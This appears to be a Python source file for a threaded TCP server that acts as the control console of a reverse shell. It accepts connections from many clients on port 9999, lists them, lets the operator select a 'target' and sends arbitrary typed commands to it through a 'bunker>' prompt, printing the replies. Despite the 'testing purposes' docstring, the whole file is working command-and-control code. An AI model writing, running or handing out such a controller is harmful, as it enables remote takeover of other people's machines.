import socket
import sys
from queue import Queue
import time
import threading

from typing import Tuple, List, Any
from typing_extensions import TypeAlias

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
_RetAddress: TypeAlias = List[Any]


class MyServer:
    """My Server for testing purposes
    """

    def __init__(self, sock=None):
        if sock is None:
            # AF_INET is the Internet address family for IPv4, SOCK_STREAM is the socket type for TCP
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            self.sock = sock

        # self.queue = Queue()
        self.all_connections: List[Tuple[socket.socket, _RetAddress]] = []

    def bind_and_listen(self, host="", port=9999):
        try:

            print(f"Binding socket to port: {port} and host: {host}")
            self.sock.bind((host, port))
            # the number of unaccepted connections that the system will allow before refusing new connections. If not specified, a default reasonable value is chosen.
            self.sock.listen(5)
            print(f"Sockets binded and listening on port: {port}")

        except socket.error as e:
            print(f"Error binding socket: {str(e)}")
            print("Retrying...")

            self.bind_and_listen()

    def accept_connection(self):

        if self.all_connections:
            for c in self.all_connections:
                con, add = c
                con.close()
            del self.all_connections[:]

        while True:
            try:
                con, add = self.sock.accept()
                self.sock.setblocking(True)  # Prevent Timeout

                self.all_connections.append((con, add))

                print(f"Accepted connection, IP: {add[0]}")
            except socket.error as e:
                print(f"Error Accepting connection: {str(e)}")

    def __send_commands(self, conn: socket.socket,  bufSize=20480):

        while True:
            try:
                cmd = input()

                if cmd == "exit" or cmd == "quit":
                    return

                if len(str.encode(cmd)) == 0:
                    continue

                conn.send(str.encode(cmd))

                client_response = str(conn.recv(bufSize), "utf-8")
                print(client_response, end="")
            except socket.error:
                print("Error sending commands")
                return

    def _list_connections(self):
        results = ""
        for i, c in enumerate(self.all_connections):
            try:
                con, _ = c
                con.send(str.encode(' '))
                con.recv(201480)  # we don't know how big we will receive

            except:
                del self.all_connections[i]
                continue

            results += str(i) + "@" + str(self.all_connections[i][1][0]) + ":" + str(
                self.all_connections[i][1][1]) + "\n"

        print("------------Clients------------\n" + results)

    def _get_target(self, i: int):
        try:
            con, add = self.all_connections[i]
            print("Connected to: " + str(add[0]))
            print(str(add[0] + ">"), end="")
            return con

        except:
            pass

    def start_bunker(self):
        while True:

            cmd = input("bunker> ")

            if cmd == "list":
                self._list_connections()

            elif "close" in cmd:

                i = cmd.replace("close ", "")
                con = self._get_target(int(i))
                if con is not None:
                    con.close()

            elif "select" in cmd:
                i = cmd.replace("select ", "")
                con = self._get_target(int(i))
                if con is not None:
                    self.__send_commands(con)

            elif cmd == "exit" or cmd == "quit":
                for c in self.all_connections:
                    con, _ = c
                    con.close()

                del self.all_connections[:]
                self.sock.close()
                sys.exit()

            else:
                print("Command not recognized")

def work(s : MyServer):
    while True:
        x = queue.get()
        if x == 1:
            s.accept_connection()

        if x == 2:
            s.start_bunker()

        
        queue.task_done()


def create_threads(s):
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(s,))
        t.daemon = True
        t.start()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


def main():
    s = MyServer()
    s.bind_and_listen()

    create_threads(s)
    create_jobs()



if __name__ == "__main__":
    main()
